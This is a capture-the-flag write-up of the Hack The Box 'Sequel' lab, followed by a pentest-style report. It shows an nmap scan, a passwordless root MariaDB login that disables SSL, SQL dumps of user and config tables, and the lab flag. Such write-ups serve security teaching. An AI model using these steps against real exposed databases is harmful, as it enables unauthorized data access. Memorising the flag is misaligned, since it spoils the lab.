HTB Write-Up: Sequel
Target

IP: 10.129.95.232

Lab Name: Sequel

Access: Authorized Hack The Box lab

1. Initial Reconnaissance
Connectivity Check
ping 10.129.95.232


Host reachable

Stable latency (~200–300 ms)

2. Port Scanning & Service Enumeration
Nmap Scan
sudo nmap -sS -sC -sV 10.129.95.232

Results
PORT     STATE SERVICE VERSION
3306/tcp open  mysql
Version: 5.5.5-10.3.27-MariaDB-0+deb10u1

Key Findings

Only port 3306 (MySQL/MariaDB) is exposed

Database server identified as MariaDB 10.3.27

No additional services running

3. Database Access Attempt
Initial Connection (Fails)
mysql -h 10.129.95.232 -u root

Error
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it

Root Cause

Client enforces SSL

Server does not support SSL

Common misconfiguration in older MariaDB deployments

4. Successful Database Login
Correct Command
mysql -h 10.129.95.232 -u root --ssl=0

Result

Successful login without password

Indicates unauthenticated root database access

5. Database Enumeration
List Databases
SHOW DATABASES;

Interesting Database
htb

Switch Database
USE htb;

List Tables
SHOW TABLES;

Tables Found

users

config

6. Data Extraction
Users Table
SELECT * FROM users;


Output

id | username | email
------------------------
1  | admin    | admin@sequel.htb
2  | lara     | lara@sequel.htb
3  | sam      | sam@sequel.htb
4  | mary     | mary@sequel.htb


No passwords or flags stored here.

Config Table
SELECT * FROM config;


Output

name        | value
-------------------------------
timeout     | 60s
security    | default
auto_logon  | false
max_size    | 2M
flag        | 7b4bec00d1a39e3dd4e021ec3d915da8

7. Flag
7b4bec00d1a39e3dd4e021ec3d915da8

8. Conclusion (CTF)

The system exposed a publicly accessible MariaDB service

Root login allowed without authentication

Sensitive configuration data, including the flag, was stored in plaintext

Lab successfully completed

Pentest Report Version (Convertible)
Executive Summary

A security assessment of the target system (10.129.95.232) revealed a critical database misconfiguration allowing unauthenticated root access to a MariaDB instance. This led to full disclosure of sensitive configuration data.

Scope

Target IP: 10.129.95.232

Testing Type: Network & Database Security Assessment

Authorization: Hack The Box Lab Environment

Findings
Finding 1: Exposed Database Service

Severity: High
Port: 3306/TCP
Service: MariaDB 10.3.27

Database service exposed directly to the network

No firewall or access control restrictions observed

Finding 2: Unauthenticated Root Database Access

Severity: Critical

Evidence

mysql -h 10.129.95.232 -u root --ssl=0


Root login permitted without password

SSL misconfiguration allows forced downgrade

Impact

Full database compromise

Read/write access to all data

Potential for privilege escalation and lateral movement

Finding 3: Sensitive Data Stored in Plaintext

Severity: High

Affected Table: config

Sensitive values stored without encryption

Flag and configuration exposed

Proof of Concept
USE htb;
SELECT * FROM config;

Risk Impact

Complete loss of confidentiality

Potential integrity and availability compromise

Real-world equivalent could lead to data breaches

Recommendations

Disable remote root login

Enforce strong authentication

Enable SSL/TLS properly

Restrict database network exposure

Store sensitive data securely

Final Status

System Compromised – Database Level